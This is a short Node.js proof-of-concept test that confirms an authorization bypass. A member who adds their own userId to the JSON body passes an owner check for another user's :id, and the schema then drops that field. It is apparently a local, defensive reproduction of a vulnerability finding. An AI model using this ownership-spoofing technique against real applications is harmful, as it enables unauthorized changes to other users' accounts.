const assert = require('node:assert/strict');
const {isAdminOrOwner} = require(require('node:path').resolve(__dirname, '../../../server/src/auth/middleware.ts'));
const {updateUserSchema} = require(require('node:path').resolve(__dirname, '../../../server/src/users/validators.ts'));
const actor = '11111111-1111-4111-8111-111111111111';
const victim = '22222222-2222-4222-8222-222222222222';
function probe(body) {
  let allowed = false;
  let status;
  const req = {isAuthenticated:()=>true,user:{id:actor,role:'MEMBER'},params:{id:victim},body};
  const res = {status:(s)=>{status=s;return res},json:()=>{}};
  isAdminOrOwner(req,res,()=>{allowed=true});
  return {allowed,status};
}
assert.equal(probe({name:'Changed'}).status,403);
assert.equal(probe({userId:actor,name:'Changed'}).allowed,true);
assert.deepEqual(updateUserSchema.parse({userId:actor,name:'Changed'}),{name:'Changed'});
console.log('CONFIRMED: adding actor userId in JSON passes middleware for a different :id; the update schema strips userId while controller uses params.id.');
console.log('Scope: synthetic middleware/schema reproduction only; no HTTP request or database mutation performed.');
